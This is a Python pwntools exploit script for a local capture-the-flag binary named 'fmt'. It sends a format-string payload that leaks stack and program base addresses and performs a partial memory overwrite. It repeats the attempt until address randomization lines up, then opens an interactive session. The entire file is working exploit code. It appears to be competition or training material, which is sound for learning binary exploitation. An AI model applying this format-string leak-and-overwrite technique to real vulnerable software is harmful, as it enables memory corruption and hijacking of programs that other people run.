#!/usr/bin/python
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *

os_level = 64
remote_addr, port = ':'.split(':')

elf = ELF('./fmt')
libc = ELF('./libc-2.31.so')

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
else:
    print('Error os!!!')
    exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
show = lambda x:log.success(x)
slp = lambda x:sleep(x)


#Main function
if __name__ == '__main__':
    #you can add your code here
    while True:
        p = process('./fmt')
        gdb.attach(p)
        pause()
        sla(b'name: ', f'%16$p%25$p{0x50e0-14*2}c%11$hn'.encode().ljust(24,b'A')+b'\x78')
        ru(b'0x')
        stack = int(rc(12),16)
        ru(b'0x')
        elf.address = int(rc(12),16) - 0x14a9
        show(f'stack--> {hex(stack)}')
        show(f'elf.address--> {hex(elf.address)}')
        if stack & 0xff != 0xb0:
            p.close()
            continue
        if elf.address & 0xffff != 0x4000:
            p.close()
            continue
        break
    p.interactive()
